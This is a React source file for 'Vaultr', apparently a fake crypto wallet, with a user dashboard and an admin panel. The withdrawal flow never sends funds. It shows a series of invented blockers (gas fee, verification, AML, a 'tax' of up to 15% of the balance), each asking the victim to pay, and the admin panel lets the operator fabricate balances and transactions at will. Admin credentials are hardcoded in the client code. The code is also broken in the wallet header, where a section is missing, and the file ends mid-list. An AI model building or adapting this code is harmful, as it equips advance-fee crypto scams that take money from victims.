import { useState, useEffect } from "react";

// ── Storage (localStorage — works on any website) ──────────────
function getUsers() {
  try { return JSON.parse(localStorage.getItem("vaultr:users") || "{}"); } catch { return {}; }
}
function saveUsers(u) {
  try { localStorage.setItem("vaultr:users", JSON.stringify(u)); } catch {}
}
function getSession() {
  try { return JSON.parse(localStorage.getItem("vaultr:session") || "null"); } catch { return null; }
}
function saveSession(s) {
  try { localStorage.setItem("vaultr:session", JSON.stringify(s)); } catch {}
}
function clearSession() {
  try { localStorage.removeItem("vaultr:session"); } catch {}
}
function makeId(len = 8) {
  return Math.random().toString(36).slice(2, 2 + len).toUpperCase();
}
function fmtUSD(n) {
  return "$" + Number(n).toLocaleString("en-US", { minimumFractionDigits: 2, maximumFractionDigits: 2 });
}
function fmtDate(ts) {
  return new Date(ts).toLocaleString("en-US", { month: "short", day: "numeric", year: "numeric", hour: "2-digit", minute: "2-digit" });
}

// ── Admin credentials ──────────────────────────────────────────
const ADMIN_EMAIL    = "admin@vaultr.com";
const ADMIN_PASSWORD = "ianokal2000";

// ── Design tokens ──────────────────────────────────────────────
const C = {
  bg: "#F2F4F7", white: "#FFFFFF", blue: "#1A73E8", blueDark: "#1558B0",
  blueLight: "#E8F0FE", green: "#1AAD6E", red: "#E84545", orange: "#F59E0B",
  text: "#111827", textSec: "#6B7280", textMute: "#9CA3AF", border: "#E5E7EB",
  shadow: "0 2px 12px rgba(0,0,0,0.07)",
  adminBg: "#0F172A", adminSurface: "#1E293B", adminBorder: "#334155", adminAccent: "#6366F1",
};

const TOKENS_META = [
  { symbol: "USDT", name: "USDT TRC20", price: 1.00,     change: -0.00, icon: "₮", bg: "#26A17B" },
  { symbol: "BTC",  name: "BTC",        price: 89136.00,  change: -1.38, icon: "₿", bg: "#F7931A" },
  { symbol: "ETH",  name: "ETH",        price: 3075.20,   change: -1.48, icon: "Ξ", bg: "#627EEA" },
  { symbol: "BNB",  name: "BNB",        price: 887.19,    change: -0.68, icon: "B", bg: "#F3BA2F" },
  { symbol: "TRX",  name: "TRX",        price: 0.2341,    change: +1.12, icon: "T", bg: "#EF0027" },
];

function getWithdrawalBlocks(totalUSD) {
  const taxPct = totalUSD > 50000 ? 0.15 : totalUSD > 10000 ? 0.10 : 0.07;
  const taxAmt = Math.ceil(totalUSD * taxPct);
  return [
    { id: "gas",    icon: "⛽", title: "Insufficient Gas Fee",         desc: "A network gas fee is required to process blockchain transactions.",    fee: fmtUSD(99) },
    { id: "verify", icon: "🪪", title: "Account Verification Required", desc: "Your identity must be verified before withdrawals can be processed.",  fee: fmtUSD(150) },
    { id: "aml",    icon: "🔍", title: "AML Check Pending",            desc: "Anti-Money Laundering compliance review must be completed.",           fee: fmtUSD(200) },
    { id: "tax",    icon: "🏦", title: "Tax Payment Required",         desc: `Tax clearance is required based on your account balance (${(taxPct * 100).toFixed(0)}% rate).`, fee: fmtUSD(taxAmt) },
  ];
}

// ── Shared UI Components ───────────────────────────────────────
function Btn({ children, onClick, style = {}, disabled = false, bg }) {
  return (
    <button disabled={disabled} onClick={onClick} style={{
      background: disabled ? "#9CA3AF" : bg || `linear-gradient(135deg,${C.blue},${C.blueDark})`,
      color: "#fff", border: "none", borderRadius: 12, padding: "14px 0",
      fontWeight: 700, fontSize: 15, cursor: disabled ? "not-allowed" : "pointer",
      width: "100%", transition: "opacity 0.15s", ...style
    }}>{children}</button>
  );
}

function Inp({ label, type = "text", value, onChange, placeholder, right, dark = false }) {
  return (
    <div style={{ marginBottom: 16 }}>
      {label && <div style={{ fontSize: 13, fontWeight: 600, color: dark ? "#94A3B8" : C.text, marginBottom: 6 }}>{label}</div>}
      <div style={{ position: "relative" }}>
        <input type={type} value={value} onChange={onChange} placeholder={placeholder} style={{
          width: "100%", boxSizing: "border-box", padding: "13px 16px",
          border: `1.5px solid ${dark ? C.adminBorder : C.border}`, borderRadius: 12, fontSize: 15,
          background: dark ? C.adminSurface : C.white, color: dark ? "#E2E8F0" : C.text, outline: "none",
          paddingRight: right ? 48 : 16,
        }} />
        {right && <div style={{ position: "absolute", right: 14, top: "50%", transform: "translateY(-50%)", color: C.textSec }}>{right}</div>}
      </div>
    </div>
  );
}

function Toast({ msg, type = "success", onDone }) {
  useEffect(() => { const t = setTimeout(onDone, 3200); return () => clearTimeout(t); }, [onDone]);
  const colors = { success: C.green, error: C.red, warning: C.orange, info: C.blue };
  return (
    <div style={{
      position: "fixed", bottom: 36, left: "50%", transform: "translateX(-50%)",
      background: colors[type] || C.green, color: "#fff", borderRadius: 12, padding: "12px 24px",
      fontSize: 14, fontWeight: 600, zIndex: 9999, boxShadow: "0 4px 24px rgba(0,0,0,0.25)",
      whiteSpace: "nowrap", maxWidth: "90vw"
    }}>{msg}</div>
  );
}

function Sheet({ children, onClose, title }) {
  return (
    <div style={{ position: "fixed", inset: 0, background: "rgba(0,0,0,0.5)", zIndex: 300, display: "flex", alignItems: "flex-end", justifyContent: "center" }} onClick={onClose}>
      <div style={{ background: C.white, borderRadius: "20px 20px 0 0", width: "100%", maxWidth: 480, maxHeight: "88vh", overflowY: "auto", boxShadow: "0 -8px 40px rgba(0,0,0,0.2)" }} onClick={e => e.stopPropagation()}>
        <div style={{ padding: "20px 24px 16px", display: "flex", justifyContent: "space-between", alignItems: "center", position: "sticky", top: 0, background: C.white, zIndex: 10, borderBottom: `1px solid ${C.border}` }}>
          <span style={{ fontWeight: 800, fontSize: 17, color: C.text }}>{title}</span>
          <button onClick={onClose} style={{ background: "none", border: "none", fontSize: 22, cursor: "pointer", color: C.textSec }}>✕</button>
        </div>
        <div style={{ padding: "20px 24px 40px" }}>{children}</div>
      </div>
    </div>
  );
}

// ── Withdrawal Flow ────────────────────────────────────────────
function WithdrawFlow({ user, onClose, onToast }) {
  const [step, setStep] = useState("form");
  const [form, setForm] = useState({ token: "USDT", amount: "", address: "" });
  const [blockIdx, setBlockIdx] = useState(0);
  const [paying, setPaying] = useState(false);
  const totalUSD = TOKENS_META.reduce((s, tk) => s + (user.balances?.[tk.symbol] || 0) * tk.price, 0);
  const blocks = getWithdrawalBlocks(totalUSD);

  const startWithdraw = () => {
    const amt = parseFloat(form.amount);
    if (!form.address || !amt || amt <= 0) { onToast("Fill all fields", "error"); return; }
    if ((user.balances?.[form.token] || 0) < amt) { onToast("Insufficient balance", "error"); return; }
    setStep("blocks"); setBlockIdx(0);
  };

  const payFee = () => {
    setPaying(true);
    setTimeout(() => {
      setPaying(false);
      if (blockIdx < blocks.length - 1) { setBlockIdx(i => i + 1); }
      else { setStep("done"); }
    }, 1800);
  };

  const block = blocks[blockIdx];

  if (step === "form") return (
    <div>
      <div style={{ background: "#FEF3C7", border: "1px solid #F59E0B", borderRadius: 12, padding: "12px 16px", marginBottom: 20, fontSize: 13, color: "#92400E" }}>
        ⚠️ Withdrawals are subject to compliance checks and network fees.
      </div>
      <div style={{ marginBottom: 14 }}>
        <div style={{ fontSize: 13, fontWeight: 600, color: C.text, marginBottom: 6 }}>Token</div>
        <select value={form.token} onChange={e => setForm(f => ({ ...f, token: e.target.value }))} style={{ width: "100%", padding: "13px 16px", border: `1.5px solid ${C.border}`, borderRadius: 12, fontSize: 15, background: C.white, color: C.text, outline: "none" }}>
          {TOKENS_META.map(t => <option key={t.symbol} value={t.symbol}>{t.name} — Bal: {user.balances?.[t.symbol] || 0}</option>)}
        </select>
      </div>
      <Inp label="Withdrawal Address" value={form.address} onChange={e => setForm(f => ({ ...f, address: e.target.value }))} placeholder="Wallet address / destination" />
      <Inp label="Amount" type="number" value={form.amount} onChange={e => setForm(f => ({ ...f, amount: e.target.value }))} placeholder="0.00" />
      <Btn onClick={startWithdraw}>Continue</Btn>
    </div>
  );

  if (step === "blocks") return (
    <div>
      <div style={{ textAlign: "center", marginBottom: 20 }}>
        <div style={{ display: "flex", justifyContent: "center", gap: 6, marginBottom: 12 }}>
          {blocks.map((b, i) => (
            <div key={b.id} style={{ width: 32, height: 6, borderRadius: 3, background: i <= blockIdx ? C.red : "#E5E7EB" }} />
          ))}
        </div>
        <div style={{ fontSize: 13, color: C.textSec }}>Step {blockIdx + 1} of {blocks.length}</div>
      </div>
      <div style={{ background: "#FFF1F2", border: `1px solid ${C.red}44`, borderRadius: 16, padding: 24, textAlign: "center", marginBottom: 20 }}>
        <div style={{ fontSize: 48, marginBottom: 12 }}>{block.icon}</div>
        <div style={{ fontWeight: 800, fontSize: 19, color: C.red, marginBottom: 8 }}>{block.title}</div>
        <div style={{ color: C.textSec, fontSize: 14, lineHeight: 1.6, marginBottom: 18 }}>{block.desc}</div>
        <div style={{ background: C.white, borderRadius: 12, padding: "14px 20px", display: "inline-block", minWidth: 160 }}>
          <div style={{ fontSize: 12, color: C.textSec, marginBottom: 4 }}>Required Payment</div>
          <div style={{ fontWeight: 800, fontSize: 28, color: C.text }}>{block.fee}</div>
        </div>
      </div>
      <div style={{ background: "#F0FDF4", border: "1px solid #BBF7D0", borderRadius: 12, padding: "12px 16px", marginBottom: 20, fontSize: 13, color: "#166534" }}>
        💡 Once this payment is confirmed, your withdrawal will proceed to the next verification step.
      </div>
      <Btn onClick={payFee} disabled={paying} bg={`linear-gradient(135deg,${C.red},#B91C1C)`}>
        {paying ? "Processing…" : `Pay ${block.fee} to Continue`}
      </Btn>
      <button onClick={onClose} style={{ width: "100%", background: "none", border: "none", color: C.textSec, fontSize: 14, marginTop: 12, cursor: "pointer", padding: "10px 0" }}>Cancel Withdrawal</button>
    </div>
  );

  if (step === "done") return (
    <div style={{ textAlign: "center", padding: "20px 0" }}>
      <div style={{ fontSize: 60, marginBottom: 16 }}>⏳</div>
      <div style={{ fontWeight: 800, fontSize: 20, marginBottom: 10, color: C.text }}>Withdrawal Under Review</div>
      <div style={{ color: C.textSec, fontSize: 14, lineHeight: 1.7, marginBottom: 24 }}>
        All compliance checks submitted. Your withdrawal is under manual review and will be processed within <strong>24–72 hours</strong>.
      </div>
      <Btn onClick={onClose} style={{ maxWidth: 200, margin: "0 auto" }}>Done</Btn>
    </div>
  );
}

// ── Statement View ─────────────────────────────────────────────
function StatementView({ user }) {
  const txs = user.transactions || [];
  const incoming = txs.filter(t => t.type === "receive");
  const outgoing  = txs.filter(t => t.type === "send");
  const totalIn   = incoming.reduce((s, t) => { const tk = TOKENS_META.find(m => m.symbol === t.token); return s + (t.amount || 0) * (tk?.price || 1); }, 0);
  const totalOut  = outgoing.reduce((s,  t) => { const tk = TOKENS_META.find(m => m.symbol === t.token); return s + (t.amount || 0) * (tk?.price || 1); }, 0);
  const totalUSD  = TOKENS_META.reduce((s, tk) => s + (user.balances?.[tk.symbol] || 0) * tk.price, 0);

  return (
    <div>
      <div style={{ background: `linear-gradient(135deg,${C.blue},${C.blueDark})`, borderRadius: 16, padding: 20, marginBottom: 20, color: "#fff" }}>
        <div style={{ fontSize: 12, opacity: 0.8, marginBottom: 4 }}>Account Summary</div>
        <div style={{ fontWeight: 800, fontSize: 20, marginBottom: 12 }}>{user.name}</div>
        <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr 1fr", gap: 10 }}>
          {[["Total Balance", fmtUSD(totalUSD)], ["Total In", fmtUSD(totalIn)], ["Total Out", fmtUSD(totalOut)]].map(([l, v]) => (
            <div key={l} style={{ background: "rgba(255,255,255,0.15)", borderRadius: 10, padding: "10px 12px" }}>
              <div style={{ fontSize: 10, opacity: 0.8, marginBottom: 3 }}>{l}</div>
              <div style={{ fontWeight: 700, fontSize: 13 }}>{v}</div>
            </div>
          ))}
        </div>
      </div>
      <div style={{ fontWeight: 700, fontSize: 12, color: C.textSec, letterSpacing: 1, marginBottom: 10 }}>ASSET BREAKDOWN</div>
      {TOKENS_META.map(tk => {
        const bal = user.balances?.[tk.symbol] || 0;
        return (
          <div key={tk.symbol} style={{ display: "flex", alignItems: "center", background: C.white, borderRadius: 12, padding: "12px 16px", marginBottom: 8, border: `1px solid ${C.border}` }}>
            <div style={{ width: 36, height: 36, background: tk.bg, borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center", color: "#fff", fontWeight: 800, fontSize: 15, marginRight: 12 }}>{tk.icon}</div>
            <div style={{ flex: 1 }}>
              <div style={{ fontWeight: 600, fontSize: 14 }}>{tk.symbol}</div>
              <div style={{ fontSize: 12, color: C.textSec }}>{bal.toLocaleString()} {tk.symbol}</div>
            </div>
            <div style={{ fontWeight: 700, fontSize: 14 }}>{fmtUSD(bal * tk.price)}</div>
          </div>
        );
      })}
      <div style={{ fontWeight: 700, fontSize: 12, color: C.textSec, letterSpacing: 1, margin: "20px 0 10px" }}>FULL TRANSACTION HISTORY</div>
      {txs.length === 0 && <div style={{ color: C.textMute, fontSize: 14, textAlign: "center", padding: 20 }}>No transactions yet</div>}
      {txs.map(tx => {
        const tk = TOKENS_META.find(m => m.symbol === tx.token);
        return (
          <div key={tx.id} style={{ display: "flex", alignItems: "center", background: C.white, borderRadius: 12, padding: "12px 16px", marginBottom: 8, border: `1px solid ${C.border}` }}>
            <div style={{ width: 36, height: 36, background: tx.type === "receive" ? `${C.green}22` : `${C.red}22`, borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center", fontSize: 18, marginRight: 12 }}>
              {tx.type === "receive" ? "↙" : "↗"}
            </div>
            <div style={{ flex: 1, minWidth: 0 }}>
              <div style={{ fontWeight: 600, fontSize: 13 }}>{tx.label}</div>
              <div style={{ fontSize: 11, color: C.textMute }}>{fmtDate(tx.time)}</div>
            </div>
            <div style={{ textAlign: "right", flexShrink: 0 }}>
              <div style={{ fontWeight: 700, fontSize: 13, color: tx.type === "receive" ? C.green : C.red }}>{tx.type === "receive" ? "+" : "-"}{tx.amount} {tx.token}</div>
              <div style={{ fontSize: 11, color: C.textMute }}>{fmtUSD((tx.amount || 0) * (tk?.price || 1))}</div>
            </div>
          </div>
        );
      })}
    </div>
  );
}

// ── Wallet Dashboard ───────────────────────────────────────────
function Wallet({ user: initUser, onLogout }) {
  const [user, setUser]     = useState(initUser);
  const [tab, setTab]       = useState("assets");
  const [dark, setDark]     = useState(false);
  const [sheet, setSheet]   = useState(null);
  const [toast, setToast]   = useState(null);
  const [hidebal, setHide]  = useState(false);
  const [sendForm, setSend] = useState({ token: "USDT", amount: "", to: "" });

  const showToast = (msg, type = "success") => setToast({ msg, type });

  const refreshUser = () => {
    const users = getUsers();
    const u = users[user.email];
    if (u) setUser(u);
  };
  useEffect(() => { refreshUser(); }, []); // eslint-disable-line

  const totalUSD = TOKENS_META.reduce((s, tk) => s + (user.balances?.[tk.symbol] || 0) * tk.price, 0);
  const incoming = (user.transactions || []).filter(t => t.type === "receive");
  const outgoing = (user.transactions || []).filter(t => t.type === "send");
  const refLink  = `${window.location.origin}${window.location.pathname}?ref=${user.refCode}`;

  const bg    = dark ? "#0E1220" : C.bg;
  const card  = dark ? "#151C2E" : C.white;
  const txt   = dark ? "#E8EDF5" : C.text;
  const sec   = dark ? "#6B7A99" : C.textSec;
  const bord  = dark ? "#1E2A42" : C.border;

  const doSend = () => {
    const amt = parseFloat(sendForm.amount);
    if (!sendForm.to || !amt || amt <= 0) { showToast("Fill all fields", "error"); return; }
    if ((user.balances?.[sendForm.token] || 0) < amt) { showToast("Insufficient balance", "error"); return; }
    const users = getUsers();
    const me = { ...users[user.email] };
    me.balances[sendForm.token] -= amt;
    me.transactions = [{ id: makeId(), type: "send", token: sendForm.token, amount: amt, label: `Sent ${sendForm.token}`, to: sendForm.to, time: Date.now() }, ...(me.transactions || [])];
    users[user.email] = me;
    saveUsers(users);
    setUser(me); setSheet(null);
    setSend({ token: "USDT", amount: "", to: "" });
    showToast(`Sent ${amt} ${sendForm.token}`);
  };

  const TxRow = ({ tx }) => {
    const tk = TOKENS_META.find(m => m.symbol === tx.token);
    return (
      <div style={{ background: card, borderRadius: 14, padding: "14px 16px", display: "flex", alignItems: "center", border: `1px solid ${bord}`, marginBottom: 8 }}>
        <div style={{ width: 40, height: 40, background: tx.type === "receive" ? `${C.green}22` : `${C.red}22`, borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center", fontSize: 18, marginRight: 12, flexShrink: 0 }}>
          {tx.type === "receive" ? "↙" : "↗"}
        </div>
        <div style={{ flex: 1, minWidth: 0 }}>
          <div style={{ fontWeight: 600, fontSize: 14, color: txt }}>{tx.label}</div>
          <div style={{ fontSize: 11, color: sec }}>{fmtDate(tx.time)}</div>
          {tx.to && <div style={{ fontSize: 11, color: sec, overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap" }}>To: {tx.to}</div>}
        </div>
        <div style={{ textAlign: "right", flexShrink: 0 }}>
          <div style={{ fontWeight: 700, fontSize: 14, color: tx.type === "receive" ? C.green : C.red }}>{tx.type === "receive" ? "+" : "-"}{tx.amount} {tx.token}</div>
          <div style={{ fontSize: 11, color: sec }}>{fmtUSD((tx.amount || 0) * (tk?.price || 1))}</div>
        </div>
      </div>
    );
  };

  return (
    <div style={{ minHeight: "100vh", background: bg, color: txt, maxWidth: 480, margin: "0 auto", fontFamily: "system-ui,-apple-system,sans-serif", paddingBottom: 80 }}>
      {toast && <Toast msg={toast.msg} type={toast.type} onDone={() => setToast(null)} />}

      {/* Header */}
      <div style={{ background: card, padding: "16px 20px", display: "flex", justifyContent: "space-between", alignItems: "center", borderBottom: `1px solid ${bord}`, position: "sticky", top: 0, zIndex: 50 }}>
        <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
          <div style={{ width: 40, height: 40, background: C.blue, borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center", color: "#fff", fontWeight: 800, fontSize: 17 }}>{user.name[0].toUpperCase()}</div>
          <div>
            <div style={{ fontWeight: 700, fontSize: 14, color: txt }}>{user.name}</div>
            <div style={{ fontSize: 11, color: sec }}>Active Account</div>
          </div>
        </div>
        <div style={{ display: "flex", gap: 14, alignItems: "center" }}>
          <button onClick={() => setSheet("referral")} style={{ background: "none", border: "none", cursor: "pointer", fontSize: 20 }}>🔗</button>
          <button onClick={() => setSheet("notifications")} style={{ background: "none", border: "none", cursor: "pointer", fontSize: 20 }}>?
          </div>
          <div style={{ background: C.bg, borderRadius: 12, padding: "12px 16px", marginBottom: 20, fontSize: 12, color: C.textSec, wordBreak: "break-all" }}>{refLink}</div>
          <Btn onClick={() => { navigator.clipboard?.writeText(refLink); showToast("Referral link copied!"); }}>Copy Referral Link</Btn>
        </Sheet>
      )}
      {sheet === "notifications" && (
        <Sheet title="🔔 Notifications" onClose={() => setSheet(null)}>
          {[
            { icon: "💰", title: "Balance Updated", desc: "Your account balance has been updated.", time: "Just now", color: C.green },
            { icon: "🎁", title: "Welcome to Vaultr", desc: "Your wallet is set up and ready to use.", time: "Today", color: C.blue },
          ].map((n, i) => (
            <div key={i} style={{ display: "flex", gap: 14, padding: "14px 0", borderBottom: `1px solid ${C.border}` }}>
              <div style={{ width: 40, height: 40, background: n.color + "22", borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center", fontSize: 20, flexShrink: 0 }}>{n.icon}</div>
              <div>
                <div style={{ fontWeight: 600, fontSize: 14, color: C.text }}>{n.title}</div>
                <div style={{ fontSize: 13, color: C.textSec, marginTop: 2 }}>{n.desc}</div>
                <div style={{ fontSize: 11, color: C.textMute, marginTop: 4 }}>{n.time}</div>
              </div>
            </div>
          ))}
        </Sheet>
      )}
    </div>
  );
}

// ── Admin Login ────────────────────────────────────────────────
function AdminLogin({ onSuccess }) {
  const [email, setEmail] = useState("");
  const [pass, setPass]   = useState("");
  const [err, setErr]     = useState("");
  const [show, setShow]   = useState(false);

  const submit = () => {
    if (email.trim().toLowerCase() === ADMIN_EMAIL && pass === ADMIN_PASSWORD) { onSuccess(); }
    else { setErr("Invalid admin credentials."); setTimeout(() => setErr(""), 3000); }
  };

  return (
    <div style={{ minHeight: "100vh", background: C.adminBg, display: "flex", alignItems: "center", justifyContent: "center", padding: 24 }}>
      <div style={{ width: "100%", maxWidth: 400 }}>
        <div style={{ textAlign: "center", marginBottom: 32 }}>
          <div style={{ width: 64, height: 64, background: C.adminAccent, borderRadius: 18, display: "flex", alignItems: "center", justifyContent: "center", fontSize: 30, margin: "0 auto 14px" }}>🛡️</div>
          <h2 style={{ color: "#E2E8F0", fontWeight: 800, fontSize: 24, margin: 0 }}>Admin Access</h2>
          <p style={{ color: "#64748B", fontSize: 14, marginTop: 6 }}>Vaultr Control Panel</p>
        </div>
        <div style={{ background: C.adminSurface, borderRadius: 20, padding: 28, border: `1px solid ${C.adminBorder}` }}>
          <Inp label="Admin Email" type="email" value={email} onChange={e => setEmail(e.target.value)} placeholder={ADMIN_EMAIL} dark />
          <Inp label="Password" type={show ? "text" : "password"} value={pass} onChange={e => setPass(e.target.value)} placeholder="Admin password" dark
            right={<span style={{ cursor: "pointer", fontSize: 12, color: "#94A3B8" }} onClick={() => setShow(v => !v)}>{show ? "Hide" : "Show"}</span>} />
          {err && <div style={{ color: C.red, fontSize: 13, marginBottom: 12, textAlign: "center" }}>{err}</div>}
          <Btn onClick={submit} bg={`linear-gradient(135deg,${C.adminAccent},#818CF8)`}>Enter Admin Panel</Btn>
        </div>
      </div>
    </div>
  );
}

// ── Admin Panel ────────────────────────────────────────────────
function AdminPanel({ onExit }) {
  const [usersData, setUsersData] = useState({});
  const [tab, setTab]             = useState("overview");
  const [sel, setSel]             = useState(null);
  const [toast, setToast]         = useState(null);
  const [search, setSearch]       = useState("");
  const [editBal, setEditBal]     = useState({ token: "USDT", amount: "", mode: "set" });
  const [showEdit, setShowEdit]   = useState(false);
  const [newU, setNewU]           = useState({ name: "", email: "", pass: "", USDT: "0", BTC: "0", ETH: "0", BNB: "0", TRX: "0" });
  const [confirmDel, setConfirmDel] = useState(null);

  const showToast = (msg, type = "success") => setToast({ msg, type });
  const load = () => { setUsersData(getUsers()); };
  useEffect(() => { load(); }, []);

  const all      = Object.values(usersData);
  const filtered = all.filter(u => u.name?.toLowerCase().includes(search.toLowerCase()) || u.email?.toLowerCase().includes(search.toLowerCase()));
  const totUSD   = u => TOKENS_META.reduce((s, tk) => s + (u.balances?.[tk.symbol] || 0) * tk.price, 0);
  const platUSD  = all.reduce((s, u) => s + totUSD(u), 0);

  const applyBal = () => {
    if (!sel) return;
    const amt = parseFloat(editBal.amount);
    if (isNaN(amt) || amt < 0) { showToast("Enter valid amount", "error"); return; }
    const users = getUsers();
    const u = { ...users[sel.email] };
    if (!u.balances) u.balances = {};
    if (editBal.mode === "set")      u.balances[editBal.token] = amt;
    if (editBal.mode === "add")      u.balances[editBal.token] = (u.balances[editBal.token] || 0) + amt;
    if (editBal.mode === "subtract") u.balances[editBal.token] = Math.max(0, (u.balances[editBal.token] || 0) - amt);
    u.transactions = [{ id: makeId(), type: editBal.mode === "subtract" ? "send" : "receive", token: editBal.token, amount: amt, label: `Admin ${editBal.mode === "set" ? "Set" : editBal.mode === "add" ? "Credit" : "Debit"}`, time: Date.now() }, ...(u.transactions || [])];
    users[u.email] = u;
    saveUsers(users);
    setUsersData({ ...users }); setSel(u); setShowEdit(false);
    setEditBal({ token: "USDT", amount: "", mode: "set" });
    showToast(`Balance updated for ${u.name}`);
  };

  const delUser = (email) => {
    const users = getUsers();
    delete users[email];
    saveUsers(users);
    setUsersData({ ...users }); setSel(null); setConfirmDel(null);
    showToast("User deleted");
  };

  const toggleSuspend = (u) => {
    const users = getUsers();
    users[u.email] = { ...u, suspended: !u.suspended };
    saveUsers(users);
    setUsersData({ ...users }); setSel(users[u.email]);
    showToast(u.suspended ? `${u.name} reactivated` : `${u.name} suspended`);
  };

  const doAddUser = () => {
    if (!newU.name || !newU.email || !newU.pass) { showToast("Fill name, email, password", "error"); return; }
    const users = getUsers();
    if (users[newU.email.toLowerCase()]) { showToast("Email already exists", "error"); return; }
    const u = {
      uid: makeId(10), name: newU.name.trim(), email: newU.email.toLowerCase(), pass: newU.pass,
      refCode: makeId(6), referredBy: null, createdAt: Date.now(), adminCreated: true,
      balances: { USDT: parseFloat(newU.USDT) || 0, BTC: parseFloat(newU.BTC) || 0, ETH: parseFloat(newU.ETH) || 0, BNB: parseFloat(newU.BNB) || 0, TRX: parseFloat(newU.TRX) || 0 },
      transactions: [],
    };
    users[u.email] = u;
    saveUsers(users);
    setUsersData({ ...users }); setTab("users");
    setNewU({ name: "", email: "", pass: "", USDT: "0", BTC: "0", ETH: "0", BNB: "0", TRX: "0" });
    showToast(`User ${u.name} created`);
  };

  return (
    <div style={{ minHeight: "100vh", background: C.adminBg, color: "#E2E8F0", fontFamily: "system-ui,-apple-system,sans-serif" }}>
      {toast && <Toast msg={toast.msg} type={toast.type} onDone={() => setToast(null)} />}

      <div style={{ background: C.adminSurface, borderBottom: `1px solid ${C.adminBorder}`, padding: "14px 20px", display: "flex", justifyContent: "space-between", alignItems: "center", position: "sticky", top: 0, zIndex: 50 }}>
        <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
          <div style={{ width: 34, height: 34, background: C.adminAccent, borderRadius: 10, display: "flex", alignItems: "center", justifyContent: "center", fontSize: 17 }}>🛡️</div>
          <div><div style={{ fontWeight: 800, fontSize: 15 }}>Vaultr Admin</div><div style={{ fontSize: 10, color: "#64748B" }}>Control Panel</div></div>
        </div>
        <div style={{ display: "flex", gap: 8 }}>
          <button onClick={load} style={{ background: "transparent", border: `1px solid ${C.adminBorder}`, color: "#94A3B8", borderRadius: 8, padding: "7px 12px", cursor: "pointer", fontSize: 13 }}>🔄</button>
          <button onClick={onExit} style={{ background: "transparent", border: `1px solid ${C.adminBorder}`, color: "#94A3B8", borderRadius: 8, padding: "7px 14px", cursor: "pointer", fontSize: 13, fontWeight: 600 }}>← Exit</button>
        </div>
      </div>

      <div style={{ background: C.adminSurface, borderBottom: `1px solid ${C.adminBorder}`, padding: "0 20px", display: "flex", gap: 2 }}>
        {[["overview", "📊 Overview"], ["users", "👥 Users"], ["adduser", "➕ Add User"]].map(([id, label]) => (
          <button key={id} onClick={() => { setTab(id); setSel(null); }} style={{ background: "transparent", border: "none", cursor: "pointer", color: tab === id ? C.adminAccent : "#64748B", borderBottom: tab === id ? `2px solid ${C.adminAccent}` : "2px solid transparent", padding: "13px 14px", fontSize: 13, fontWeight: 700, whiteSpace: "nowrap" }}>{label}</button>
        ))}
      </div>

      <div style={{ padding: "20px 16px", maxWidth: 860, margin: "0 auto" }}>

        {/* Overview */}
        {tab === "overview" && (
          <div>
            <div style={{ display: "flex", flexWrap: "wrap", gap: 12, marginBottom: 24 }}>
              {[["👥 Total Users", all.length, "#6366F1"], ["💰 Platform Value", fmtUSD(platUSD), C.green], ["✅ Active", all.filter(u => !u.suspended).length, "#34D399"], ["🚫 Suspended", all.filter(u => u.suspended).length, C.red]].map(([l, v, col]) => (
                <div key={l} style={{ background: C.adminSurface, border: `1px solid ${C.adminBorder}`, borderRadius: 14, padding: "18px 20px", flex: 1, minWidth: 130 }}>
                  <div style={{ color: "#94A3B8", fontSize: 12, marginBottom: 6 }}>{l}</div>
                  <div style={{ color: col, fontWeight: 800, fontSize: 22 }}>{v}</div>
                </div>
              ))}
            </div>
            <div style={{ background: C.adminSurface, border: `1px solid ${C.adminBorder}`, borderRadius: 14, padding: 20, marginBottom: 20 }}>
              <div style={{ fontWeight: 700, fontSize: 13, color: "#94A3B8", marginBottom: 14, letterSpacing: 1 }}>TOKEN HOLDINGS</div>
              {TOKENS_META.map(tk => {
                const total = all.reduce((s, u) => s + (u.balances?.[tk.symbol] || 0), 0);
                return (
                  <div key={tk.symbol} style={{ display: "flex", alignItems: "center", padding: "10px 0", borderBottom: `1px solid ${C.adminBorder}` }}>
                    <div style={{ width: 32, height: 32, background: tk.bg, borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center", color: "#fff", fontWeight: 800, fontSize: 13, marginRight: 12 }}>{tk.icon}</div>
                    <div style={{ flex: 1, color: "#CBD5E1", fontWeight: 600 }}>{tk.symbol}</div>
                    <div style={{ textAlign: "right" }}>
                      <div style={{ fontWeight: 700, color: "#E2E8F0" }}>{total.toLocaleString()} {tk.symbol}</div>
                      <div style={{ fontSize: 11, color: "#64748B" }}>{fmtUSD(total * tk.price)}</div>
                    </div>
                  </div>
                );
              })}
            </div>
            <div style={{ background: C.adminSurface, border: `1px solid ${C.adminBorder}`, borderRadius: 14, padding: 20 }}>
              <div style={{ fontWeight: 700, fontSize: 13, color: "#94A3B8", marginBottom: 14, letterSpacing: 1 }}>RECENT SIGNUPS</div>
              {all.sort((a, b) => (b.createdAt || 0) - (a.createdAt || 0)).slice(0, 6).map(u => (
                <div key={u.email} onClick={() => { setSel(u); setTab("users"); }} style={{ display: "flex", alignItems: "center", padding: "10px 0", borderBottom: `1px solid ${C.adminBorder}`, cursor: "pointer" }}>
                  <div style={{ width: 34, height: 34, background: C.adminAccent, borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center", color: "#fff", fontWeight: 800, marginRight: 12, fontSize: 15 }}>{u.name?.[0]?.toUpperCase() || "?"}</div>
                  <div style={{ flex: 1 }}>
                    <div style={{ fontWeight: 600, color: "#E2E8F0", fontSize: 13 }}>{u.name}</div>
                    <div style={{ fontSize: 11, color: "#64748B" }}>{u.email}</div>
                  </div>
                  <div style={{ color: C.green, fontWeight: 700, fontSize: 13 }}>{fmtUSD(totUSD(u))}</div>
                </div>
              ))}
              {all.length === 0 && <div style={{ color: "#64748B", textAlign: "center", padding: 20 }}>No users yet</div>}
            </div>
          </div>
        )}

        {/* Users List */}
        {tab === "users" && !sel && (
          <div>
            <input value={search} onChange={e => setSearch(e.target.value)} placeholder="Search name or email…"
              style={{ width: "100%", boxSizing: "border-box", background: C.adminSurface, border: `1.5px solid ${C.adminBorder}`, borderRadius: 12, padding: "12px 16px", color: "#E2E8F0", fontSize: 14, outline: "none", marginBottom: 16 }} />
